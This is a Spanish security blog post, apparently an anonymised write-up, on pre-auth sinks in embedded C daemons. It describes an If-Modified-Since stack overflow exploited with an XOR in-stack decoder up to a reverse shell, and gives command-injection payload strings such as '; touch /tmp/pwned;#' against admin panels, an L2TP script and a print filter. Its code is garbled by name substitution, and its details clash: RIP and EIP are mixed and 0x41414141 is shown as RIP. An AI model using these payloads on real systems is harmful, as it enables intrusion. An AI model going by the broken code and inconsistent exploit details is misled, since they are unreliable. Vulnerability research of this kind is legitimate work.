+<blockquote>◆ Veredicto <p><b>Stack overflow</b> · pre-auth · CWE-121 · Control parcial del RIP · Sin CVE · Sin fix · Validado E2E · Requiere ≥1 archivo en el docroot.</p>
+</blockquote>
+<h2>21. El sink: file.c el conversor de fecha a timestamp</h2>
+c<pre class="code"><code>// file.c:136 — el conversor de fecha a timestamp
+static int el conversor de fecha a timestamp(char *date, time_t *out) { char buf[128]; // buffer fijo en el stack... strncpy(buf, date, strlen(date)); // SIN bound de destino: desborda buf // 'date' proviene de la cabecera If-Modified-Since del request...
+}</code></pre>
+<p>El bug: el tamaño copiado viene dado por el <b>origen</b> (<code>strlen(date)</code>), no por el <b>destino</b> (<code>sizeof(buf)</code>). Un <code>If-Modified-Since</code> de más de 128 bytes empieza a sobrescribir el marco de stack.</p>
+<h2>22. La explotación (decoder XOR in-stack)</h2>
+<p>Para convertir el desbordamiento en control del RIP en la toolchain de referencia (sin canario), el shellcode se auto-decoda en el propio stack. El bytecode <b>XOR</b> escrito in-stack evita los bytes malos del parsing HTTP (espacios, salto de línea, etc.) y redirige el RIP hacia allí.</p>
+txt<pre class="code"><code># Layout del payload sobre el stack (orden de escritura del strncpy):
+[ padding ][ buf[128] ][ ROMPER_EBP ][ EIP_dirige_a_stack ][ shellcode_XOR ]
+# El decoder XOR (8 bytes) se ejecuta primero y desofusca el shellcode
+# que aparece después en el stack, evadiendo bytes prohibidos del HTTP.
+# Ejecución: fecha=&lt;padding&gt;&lt;EIP&gt;&lt;decoder&gt;&lt;shellcode_xor_encoded&gt;</code></pre>
+<p>La observación clave de la validación: bajo <code>gdb</code> (que usa ptrace) la dirección del stack era <b>+0xC0 bytes</b> distinta de la del run nativo. Solo reconstruyendo el layout en el run real se logró aterrizar el EIP en el shellcode. Ese tipo de disparidad nativo/gdb es exactamente lo que el estándar E2E exige demostrar.</p>
+<h2>23. El PoC</h2>
+<p>El PoC es un GET con un <code>If-Modified-Since</code> de ~220 bytes. Una prueba limpia del control de flujo es un valor guía:</p>
+http<pre class="code"><code># GET a un archivo del docroot con la cabecera larga
+GET /index.html HTTP/1.1
+Host: 127.0.0.1:8080
+If-Modified-Since: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... # ~220 bytes
+# Con ASAN se observa el stack-buffer-overflow en el conversor de fecha a timestamp
+# Y con el EIP guiado, el RIP aterriza en 0x41414141 (control parcial)</code></pre>
+<h2>24. Validación E2E (ASAN + gdb)</h2>
+bash<pre class="code"><code># Compilar el servidor HTTP embebido con ASAN para confirmar el overflow exacto
+gcc -fsanitize=address -g -O0... el módulo del servidor HTTP
+# 1. Reporte ASAN del desbordamiento en el stack
+$./app
+ERROR: AddressSanitizer: stack-buffer-overflow on address... WRITE of size 4 at... # el conversor de fecha a timestamp, buf[128] sobrescrito
+# 2. Control del EIP bajo gdb
+(gdb) r
+Program received signal SIGSEGV
+RIP = 0x41414141 # control parcial del flujo
+# 3. Run nativo: reconstruir el layout +0xC0 para aterrizar el shellcode
+$./app # reverse shell low-priv hacia el atacante</code></pre>
+<figure class="figure"> <img src="img/http-01-sink.png" alt="Fase 1: el sink el conversor de fecha a timestamp identificado" loading="lazy"> <figcaption class="figcap">Fase 1 — Identificación del sink el conversor de fecha a timestamp en file.c, el strncpy sin bound de destino.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/http-02-desborde.png" alt="Fase 3: servidor levantado y payload preparado" loading="lazy"> <figcaption class="figcap">Fase 3 — Servidor en marcha y payload del header If-Modified-Since preparado.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/http-03-rop.png" alt="Fase 4: el desbordamiento disparado" loading="lazy"> <figcaption class="figcap">Fase 4 — El desbordamiento se dispara con la fecha de 220 bytes.</figcaption>
+</figure>
+<figure class="figure"> <img src="img/http-04-shell.png" alt="Fase 5: shell obtenida" loading="lazy"> <figcaption class="figcap">Fase 5 — Shell de baja autoridad obtenida vía el decoder XOR in-stack.</figcaption>
+</figure>
+<h2>25. Limitaciones de toolchain y mitigación</h2> <table> <thead><tr><th>Mitigación</th><th>Impacto en el PoC</th></tr></thead> <tbody> <tr><td>Canario (-fstack-protector)</td><td>Aborta antes del ret si está activo; no lo estaba en la toolchain de referencia</td></tr> <tr><td>NX stack</td><td>Necesita el decoder+RIP ejecutable; en MCU embebido típicamente NX desactivado</td></tr> <tr><td>ASLR</td><td>El layout in-stack es determinista (dirección fija), elude ASLR del heap/libs</td></tr> </tbody> </table>
+<blockquote>⚠ Divulgación responsable <p>El fix en el mantenedor es copiar con un bound basado en el destino (<code>strncpy(buf, date, sizeof(buf)-1)</code> y terminar), o validar la longitud de la cabecera antes del parseo. Comunicado al mantenedor como parte del proceso responsable.</p>
+</blockquote>
+
+<p class="resumen"><strong>Continuidad.</strong> Dos casos de impacto acotado,included porque son la leccion: una primitiva real no es automaticamente una cadena.</p>
+
+<h2>26. Resumen de Ambos Casos</h2> <table> <thead><tr><th>Caso</th><th>Clase</th><th>Primitiva</th><th>¿Cadena a RCE?</th><th>Conclusión</th></tr></thead> <tbody> <tr><td>la biblioteca cliente del protocolo de streaming el decodificador del formato de serialización</td><td>CWE-125</td><td>OOB read (fuga)</td><td>No</td><td>Info-leak, sin ejecución</td></tr> <tr><td>el servidor HTTP mínimo el generador de credenciales</td><td>CWE-78</td><td>Command injection</td><td>Sí (local)</td><td>Utilidad CLI, no alcanzable remota</td></tr> </tbody> </table> <h2>27. Caso A — la biblioteca cliente del protocolo de streaming OOB read el decodificador del formato de serialización</h2> <p> <strong>la biblioteca cliente del protocolo de streaming</strong> es la librería del cliente el protocolo de streaming usada por el volcador de flujos del protocolo y, a través de él, por muchísimos reproductores y utilidades de streaming. El protocolo el protocolo de streaming encapsula mensajes el formato de serialización (Action Message Format) y el tipo 0x14 corresponde a el decodificador del formato de serialización INVOKE. El parser de estructuras el decodificador del formato de serialización lee valores con un rango mal acotado, produciendo una <strong>lectura fuera de límites</strong>. </p> <pre><code>// la routine de lectura de numero del decodificador / la routine de lectura de cadena del decodificador: lectura sin validar el rango
+double la routine de lectura de numero del decodificador(el objeto contenedor del formato *obj) {... // avanza el buffer según la longitud declarada sin comprobar // que quede dentro del payload => OOB READ (CWE-125)
+}
+// Vía de entrada: un servidor el protocolo de streaming malicioso envía packet type 0x14
+// (el decodificador del formato de serialización INVOKE) con una longitud que empuja la lectura fuera del buffer
+packet_type = 0x14; // el decodificador del formato de serialización invoke, from server -> client</code></pre> <p> El desencadenante es que el <em>cliente</em> (el volcador de flujos del protocolo/aplicación) procesa un mensaje del <em>servidor</em> el protocolo de streaming. Al ser una lectura fuera de límites, el resultado es una fuga de memoria del heap y, en el mejor caso, un crash del cliente. No hay una cadena directa a ejecución de código arbitraria en las compilaciones típicas. Además, esta zona del código pertenece a una familia de bugs previos de la biblioteca cliente del protocolo de streaming (por ejemplo el strcpy sin bound en el handler de metadata), que ya fueron corregidos; este sumidero concreto repite el patrón de validación ausente. </p> <blockquote><p><strong>Alcance real</strong></p>Es una primitiva de fuga de memoria en el lado cliente, alcanzable solo contra una aplicación que se conecte a un servidor el protocolo de streaming malicioso. No escala a RCE, y es variante de un patrón ya corregido en la misma librería.</blockquote> <h2>28. Caso B — el servidor HTTP mínimo el generador de credenciales</h2> <p> <strong>el servidor HTTP mínimo</strong> es un servidor HTTP mínimo muy usado en sistemas embebidos y routers. Distribuye, junto al daemon, utilidades auxiliares —entre ellas el generador de credenciales, que genera los ficheros de autenticación. El argumento (normalmente el nombre de archivo de passwords) llega a un system sin validar: </p> <pre><code>// el generador de credenciales:214-215 — el argumento del usuario se inyecta en un comando
+sprintf(command, "cp %s %s", argv[1],...); // argv[1] sin validar
+system(command); // /bin/sh -c "cp &lt;argv[1]&gt;..."
+// Con argumento"; touch /tmp/pwned;#" se inyecta ejecución local./el generador de credenciales ";touch /tmp/pwned;#" # command injection local</code></pre> <p> Es un command injection real: el input del usuario llega a sh -c. La limitación crítica es que el generador de credenciales es una <strong>utilidad de línea de comandos local</strong> —no un daemon que escuche. Para explotarla, un atacante ya necesita ejecución local en el sistema o un servidor CGI/helper que derive su invocación de input remoto, que no es el patrón de despliegue por defecto. </p> <blockquote><p><strong>Alcance real</strong></p>Inyección genuina pero con superficie local: requiere un deploy donde un helper invoque el generador de credenciales con input influenciable, o acceso local previo. No es alcanzable desde internet contra el daemon por defecto.</blockquote> <h2>29. La Lección: Primitiva vs Impacto</h2> <p> Lo que estos dos casos enseñan, junto a los demás de la serie, es que la gravedad de un hallazgo no depende solo de la clase (CWE), sino del <strong>encadenamiento a ejecución de código y del despliegue real</strong>: </p> <ul> <li><strong>la biblioteca cliente del protocolo de streaming</strong> es un bug real de lectura fuera de límites que se queda en fuga/crash del cliente, sin camino a RCE.</li> <li><strong>el servidor HTTP mínimo el generador de credenciales</strong> tiene inyección de comandos real, pero solo alcanzable con ejecución local previa o un helper no-estándar.</li> </ul> <p> En contraste, el daemon de portal cautivo, el daemon de autenticación y redirección y el servidor HTTP embebido demostraron <strong>ejecución de código verificada</strong>. La diferencia no es el CWE, es la cadena completa y el alcanzamiento del código vulnerable desde una superficie real. Para evaluar un hallazgo hay que preguntarse: <em>¿el código vulnerable es alcanzable desde donde un atacante puede estar, y convierte eso en ejecución?</em> </p> <h2>30. Referencias</h2> <table> <thead><tr><th>Referencia</th><th>Descripción</th></tr></thead> <tbody> <tr><td>la biblioteca cliente del protocolo de streaming</td><td>Librería cliente el protocolo de streaming (el volcador de flujos del protocolo)</td></tr> <tr><td>la routine de lectura de numero del decodificador/String</td><td>Sink del OOB read (packet type 0x14)</td></tr> <tr><td>el generador de credenciales:214</td><td>Sink sprintf + system en el servidor HTTP mínimo</td></tr> <tr><td>CWE-125</td><td>Out-of-bounds Read</td></tr> <tr><td>CWE-78</td><td>Improper Neutralization in OS Command</td></tr> </tbody> </table>
+
+<p class="resumen"><strong>Continuidad.</strong> Y cuatro sinks mas, en la suite de administracion del servidor, donde la pregunta correcta no es si se inyecta sino si se alcanza.</p>
+
+<h2>31. Resumen de los Cuatro Sinks</h2> <table> <thead><tr><th>Target</th><th>Sink</th><th>Clase</th><th>Privilegio</th><th>Alcance</th></tr></thead> <tbody> <tr><td>el panel web de administración del servidor</td><td>el instalador de módulos del lenguaje, vía web:45</td><td>CWE-78</td><td>root</td><td>Post-auth</td></tr> <tr><td>el panel web de administración restringida</td><td>ssh/el script de configuración por web:9/12</td><td>CWE-78</td><td>no-root</td><td>Post-auth</td></tr> <tr><td>el daemon de túnel L2TP/IPsec</td><td>el script de subida de interfaz/down ($6)</td><td>CWE-78</td><td>root</td><td>L2TP (config)</td></tr> <tr><td>el spooler de impresión</td><td>el generador de filtros de impresión sh -c</td><td>CWE-78</td><td>lp</td><td>LAN</td></tr> </tbody> </table> <p> El hilo común es que todos ejecutan un shell con datos que en algún punto provienen de la red o de un campo de configuración sin sanear. Son la clase de bug que el core de cada producto ha ido endureciendo, pero que sobrevive en los <em>scripts admin</em> y los <em>helpers</em> —lo que esta serie llama la superficie que el mantenimiento no mira. </p> <h2>32. el panel web de administración del servidor el instalador de módulos del lenguaje, vía web</h2> <p> El módulo de instalación de módulos Perl de el panel web de administración del servidor (el gestor de módulos del lenguaje) pasa los argumentos del usuario directamente a la apertura de un pipe de comandos: </p> <pre><code>// el instalador de módulos del lenguaje, vía web:45 — el argumento del usuario entra a un comando
+open(CMD, "...". $module. " |") or die(...);
+// un pipe "|" se ejecuta con /bin/sh -c; $module sin escapar => inyección
+// Presente sin cambios desde hace muchos años (sink heredado/legacy)</code></pre> <p> El sink está en el cierre del pipe con |, que el intérprete ejecuta con /bin/sh -c. Un módulo como;touch /tmp/x;# termina la parte "normal" y ejecuta el comando inyectado. El alcance es <strong>post-auth</strong>: requiere una sesión válida de el panel web de administración del servidor (con los privilegios del administrador, root). No es un bug pre-auth. </p> <h2>33. el panel web de administración restringida ssh/el script de configuración por web y el buscador de ficheros por web</h2> <p> <strong>el panel web de administración restringida</strong> comparte el motor el servidor web de administración con el panel web de administración del servidor pero sirve a usuarios normales, no al admin. Tiene dos sinks de la familia: </p> <pre><code>// ssh/el script de configuración por web:9/12 — el tipo ($type) se interpola sin quotemeta
+$cmd = "...". $type. "...";
+system($cmd); // $type del usuario, sin escapar
+// htaccess/el buscador de ficheros por web:9 — open con pipe sobre input
+open(FIND, "find...". $_. " |") or die(...);
+// $_ (dato del request) entra a un pipe sh -c sin quotemeta</code></pre> <p> Ambos son <strong>post-auth</strong> y, por defecto, corren con el uid del usuario de el panel web de administración restringida (el servidor web de administración baja el euid): el RCE llega como un usuario no-root. La inyección es real pero el impacto queda acotado a la cuenta del usuario autenticado salvo que la configuración eleve privilegios. </p> <h2>34. el daemon de túnel L2TP/IPsec L2TP → scripts el script de subida de interfaz</h2> <p> <strong>el daemon de túnel L2TP/IPsec</strong> es un servidor PPP/BGP/L2TP para BRAS y LNS de ISP. En su modo de compatibilidad la capa de compatibilidad del demonio de túnel, ejecuta los scripts el script de subida de interfaz/ip-down con los campos de la sesión sin escapar. El AVP que llega sin sanear es el CALLING_SID (el identificador llamante), que se expande en el script: </p> <pre><code>// el script de subida de interfaz/ip-down — CALLING_SID ($6) se evalúa sin comillas
+eval "$6"; // el AVP llamante del túnel L2TP entra a un eval
+// Origen: el Calling-SID del paquete ICRQ L2TP (UDP 1701), 0-click
+// con conteño:;id> /tmp/x;# => ejecución en el script de sesión</code></pre> <p> Es un camino <strong>pre-auth y 0-click</strong> por UDP L2TP (puerto 1701), porque el túnel se inicia antes de autenticarse. La ejecución es <strong>root</strong> (los scripts de ppp corren como root). La limitación real es que requiere la config de compatibilidad la capa de compatibilidad del demonio de túnel con los scripts presentes, que no es la instalación por defecto pura. </p> <h2>35. el filtro de la impresora: el navegador de impresoras → el generador de filtros de impresión</h2> <p> <strong>el spooler de impresión</strong> es el sistema de impresión estándar. El daemon el navegador de impresoras descubre impresoras de red y, al procesar trabajos, deriva el filtro el generador de filtros de impresión que ejecuta con un shell: </p> <pre><code>// el navegador de impresoras → el generador de filtros de impresión → sh -c
+// El perfil de color (el perfil de color de la impresora) se pasa fuera del allowlist
+// y se interpola en el comando del filtro:
+sh -c "... el generador de filtros de impresión..." // perfil no validado => inyección
+// Origen: perfil manipulado vía descubrimiento el navegador de impresoras
+// (ya cubierto por la familia CVE-2024-47177 — variante allowlist)</code></pre> <p> El vector es el descubrimiento de impresoras de red (el navegador de impresoras): un perfil fuera del allowlist del mantenedor se interpola en el comando del filtro. Ejecuta como lp (usuario del sistema de impresión). El alcance es una LAN con impresión en red (el navegador de impresoras activo), no Internet de forma directa. </p> <h2>36. El bypass de confianza X-SSL-Client-*</h2> <p> el panel web de administración del servidor/el panel web de administración restringida validan la autenticación por cliente SSL. En despliegues detrás de un reverse proxy, el motor el servidor web de administración confía en las cabeceras X-SSL-Client-* que el proxy inyecta para indicar el certificado del cliente: </p> <pre><code>// la biblioteca del servidor web de administración — confianza en las cabeceras SSL del proxy
+$header{"X-SSL-Client-DN"}, $header{"X-SSL-Client-Cert"}...
+// se usan para resolver el usuario por certificado (find_user_by_cert)</code></pre> <p> La clase de riesgo conceptual es que, si el motor no distingue una cabecera inyectada por el atacante de una inyectada por el proxy, todos los sinks <em>post-auth</em> de la familia podrían volverse <em>pre-auth</em> por composición. Tras validación rigurosa, el alcance real de este bypass en config estándar es limitado: </p> <ul> <li>Requiere la opción de confiar en la IP real=1 en el fichero de configuración del servidor web de administración (opt-in del admin para reverse proxy).</li> <li>El peer IP del cliente debe estar dentro de trusted_proxies; si no, el motor borra esas cabeceras (delete $header{...}).</li> <li>El X-SSL-Client-DN espoofeado debe coincidir <strong>exacto</strong> con un certificado pre-registrado a un usuario en find_user_by_cert. No es un bypass ciego fabricable a voluntad.</li> </ul> <blockquote><p><strong>Nota de honestidad técnica</strong></p>Con los tres prerequisitos activos, el bypass sí convierte los sinks post-auth en pre-auth. Pero ninguna de esas condiciones es el valor por defecto de la configuración: son cambios que un admin habilita para operar tras un reverse proxy. La lección general de este análisis es <strong>verificar siempre el valor real de la configuración por defecto antes de declarar una clase de alcance</strong>; "común en producción" no es lo mismo que "config por defecto".</blockquote> <h2>37. Referencias</h2> <table> <thead><tr><th>Referencia</th><th>Descripción</th></tr></thead> <tbody> <tr><td>el panel web de administración del servidor el instalador de módulos del lenguaje, vía web:45</td><td>Sink open(CMD,"...|") → sh -c, heredado/multi-año</td></tr> <tr><td>el panel web de administración restringida ssh/el script de configuración por web:9/12</td><td>system con $type sin quotemeta</td></tr> <tr><td>el panel web de administración restringida htaccess/el buscador de ficheros por web:9</td><td>open(FIND,"...|") con input del request</td></tr> <tr><td>el daemon de túnel L2TP/IPsec el script de subida de interfaz/down</td><td>eval de CALLING_SID ($6) sobre AVP L2TP</td></tr> <tr><td>el filtro de la impresora el navegador de impresoras</td><td>el perfil de color de la impresora → el generador de filtros de impresión sh -c (variante CVE-2024-47177)</td></tr> <tr><td>la biblioteca del servidor web de administración</td><td>Confianza en cabeceras X-SSL-Client-* (bypass condicional)</td></tr> <tr><td>CWE-78</td><td>Improper Neutralization in OS Command</td></tr> </tbody> </table> <blockquote><p><strong>Divulgación responsable</strong></p>Estos sinks se publican con fines de hardening y concienciación. La mitigación común a toda la familia es simple y robusta: <strong>nunca interpolar datos de red o de request en un shell</strong> — usar quotemeta/escapado en Perl para la familia el servidor web de administración, no derivar comandos por eval en los scripts ppp, y validar los perfiles contra el allowlist en el spooler de impresión. Cada caso fue comunicado al mantenedor como parte del proceso responsable.</blockquote>
+
+</article>
+<section class="related"><h2>Sigue leyendo</h2><div class="grid-2"><div class="post-item"><span class="meta">2026-08-21 · Vulnerability Research</span><a href="cazar-con-ia-local.html">Cazar con IA local: pipeline, triaje y seis hallazgos verificados</a></div><div class="post-item"><span class="meta">2026-06-01 · Blue Team</span><a href="deteccion-blue-team.html">Tres tecnicas clasicas y como se detectan: sudo, Windows y evasion de opcodes</a></div><div class="post-item"><span class="meta">2026-09-24 · Agentes</span><a href="agentes-ia-locales.html">Cómo trabajo con agentes de IA locales: arquitectura, memoria y resultados</a></div></div></section>
+</main>
+<footer class="site-footer"><div class="footer-inner">
+<div class="social"><a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">GitHub</a><a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">LinkedIn</a><a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">X / Twitter</a><a href="https://tty503.com/feed.xml" target="_blank" rel="noopener noreferrer">RSS</a></div>
+<p class="footer-note">© <span data-year></span> Christian Márquez (tty503). Investigación en seguridad y herramientas propias, documentadas con honestidad. Los detalles explotables de los hallazgos se omiten por política de divulgación responsable.</p>
+</div></footer>
+<button class="to-top" aria-label="Volver arriba">↑</button>
+<script src="assets/js/main.js"></script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "Cinco clases de sink pre-auth en daemons C embebidos",
+      "description": "Del primer paquete de un handshake a un interprete de comandos: cinco cadenas reales de inyeccion en daemons C de firmware de router, con la clase de vulnerabilidad, el punto de entrada y el alcance honesto de cada una. Sin nombres de proyecto: el metodo es lo que se publica.",
+      "author": { "@type": "Person", "name": "Christian Márquez", "url": "https://tty503.com" },
+      "publisher": { "@type": "Organization", "name": "tty503" },
+      "datePublished": "2026-09-02",
+      "dateModified": "2026-09-02",
+      "mainEntityOfPage": "https://tty503.com/sinks-preauth-daemons-c.html",
+      "inLanguage": "es",
+      "keywords": "CWE-78, CWE-121, CWE-125, RCE pre-auth, Auditor\u00eda"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [{"@type": "ListItem", "position": 1, "item": {"@id": "https://tty503.com/index.html", "name": "tty503"}}, {"@type": "ListItem", "position": 2, "item": {"@id": "https://tty503.com/sinks-preauth-daemons-c.html", "name": "Cinco clases de sink pre-auth en daemons C embebidos"}}]
+    }
+  ]
+}
+</script>
+</body>
+</html>
